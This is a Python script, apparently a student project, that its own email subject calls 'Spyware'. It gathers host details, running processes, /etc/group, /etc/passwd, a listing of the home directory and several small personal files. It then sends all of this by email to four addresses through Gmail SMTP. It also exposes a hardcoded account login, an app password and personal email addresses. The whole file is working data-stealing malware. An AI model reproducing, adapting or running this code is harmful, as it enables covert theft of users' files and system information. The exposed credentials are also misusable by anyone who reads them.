from email.mime.text import MIMEText
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import smtplib
import ssl
import platform
import subprocess
import urllib.request as urllib

nombres_archivo = []

def obtenerDetalles():
    resultado = "Detalles del equipo: \n"
    # printing the Architecture of the OS
    resultado = resultado + "[+] Architecture :" + platform.architecture()[0] + "\n"

    # Displaying the machine
    resultado = resultado + "[+] Machine :" + platform.machine() + "\n"

    # printing the Operating System release information
    resultado = resultado + "[+] Operating System Release :" + platform.release() + "\n"

    # prints the currently using system name
    resultado = resultado + "[+] System Name :" + platform.system() + "\n"

    # This line will print the version of your Operating System
    resultado = resultado + "[+] Operating System Version :" + platform.version() + "\n"

    # This will print the Node or hostname of your Operating System
    resultado = resultado + "[+] HostName: " + platform.node() + "\n"

    # This will print your system platform
    resultado = resultado + "[+] Platform :" + platform.platform() + "\n"

    #This will print the processor information
    resultado = resultado + "[+] Processor :" + platform.processor() + "\n"
   
    #Obtenemos los procesos activos
    resultado = resultado + "\nProcesos activos: \n"
    procesos = subprocess.getoutput("ps -e")
    resultado = resultado + procesos + "\n"
    
    #Leemos el archivo de grupos y usuarios
    resultado = resultado + "\nGrupos y usuarios: \n"
    archivo = open("/etc/group", "r").read()
    resultado = resultado + archivo + "\n"

    #Hacemos el recorrido de los directorios y listamos los archivos con su tamaño
    contador = 0
    resultado = resultado + "Archivos: \n"
    contenido = os.listdir(os.path.expanduser('~'))
    for fichero in contenido:
        if os.path.isfile(os.path.expanduser('~') + "/" + fichero):
            #Agregamos los 3 primeros archivos que pesen menos de 7 MB
            if os.path.getsize(os.path.expanduser('~') + "/" + fichero) < 7000000 and contador < 4:
                nombres_archivo.append(os.path.expanduser('~') + "/" + fichero)
            resultado = resultado + fichero + "  " + str(os.path.getsize(os.path.expanduser('~') + "/" + fichero)) + " bytes"+ "\n"
            contador = contador + 1
        else:
            resultado = resultado + "Carpeta: " + fichero + "\n"
            for fic in os.listdir(os.path.expanduser('~') + "/" + fichero):
                if os.path.isfile(os.path.expanduser('~') + "/" + fichero + "/" + fic):
                    resultado = resultado + "   |___" + fic + "  " + str(os.path.getsize(os.path.expanduser('~') + "/" +  fichero + "/" + fic)) + " bytes" + "\n"
                else:
                    resultado = resultado + "   |___" + fic + "\n"
                    
    #Adjuntamos el archivo de contraseñas             
    nombres_archivo.append("/etc/passwd")

    #Obtenemos las IP pública y local
    resultado = resultado + "\nIP local y pública: \n"
    local = subprocess.getoutput("ifconfig | grep 'inet ' | grep -Fv 127.0.0.1 | awk '{print $2}'")
    servidor1 = 'http://www.soporteweb.com'
    consulta1 = urllib.build_opener()
    consulta1.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0')] 

    url1 = consulta1.open(servidor1, timeout=17)
    respuesta1 = url1.read()
    try:
      respuesta1 = respuesta1.decode('UTF-8')
    except UnicodeDecodeError:
      respuesta1 = respuesta1.decode('ISO-8859-1')
    url1.close() 
    
    resultado = resultado + "Local: " + local + "   Pública: " + respuesta1
    enviar_correo(resultado)

#Envía el correo adjuntando toda la información y los archivos obtenidos
def enviar_correo(contenido):
    mensaje = MIMEMultipart()
    Destino=['dylan_radilla@ciencias.unam.mx','emma07p9@gmail.com','andrebarra@ciencias.unam.mx','cyndi_cieusagi@ciencias.unam.mx']
    mensaje["From"] = "emmanuel_delgado@ciencias.unam.mx"
    mensaje["To"] = "dylan_radilla@ciencias.unam.mx"
    mensaje["Subject"] = "Spyware"

    attach_text = MIMEText(contenido, 'plain')
    mensaje.attach(attach_text)

    for f in nombres_archivo:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(f, "rb").read())
        part.add_header('Content-Disposition', "attachment; filename= {0}".format(os.path.basename(f)))
        mensaje.attach(part)

    contexto = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=contexto) as smtp:
        smtp.login("emmanuel_delgado@ciencias.unam.mx","dtsq ecoz owwx netg")
        smtp.sendmail("emmanuel_delgado@ciencias.unam.mx", Destino, mensaje.as_string().encode('utf-8'))
        smtp.quit()


obtenerDetalles()
